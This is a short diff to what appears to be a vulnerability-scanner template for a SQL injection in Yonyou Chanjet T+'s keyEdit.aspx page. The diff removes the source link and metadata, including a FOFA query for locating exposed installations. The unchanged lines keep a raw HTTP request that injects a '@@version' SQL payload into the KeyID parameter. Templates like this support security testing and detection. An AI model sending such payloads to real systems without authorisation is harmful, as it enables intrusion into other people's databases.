@@ -3,12 +3,8 @@ info:
   name: 用友畅捷通 keyEdit.aspx SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gb0qusucx71oevvn'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gb0qusucx71oevvn
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - 'GET /tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
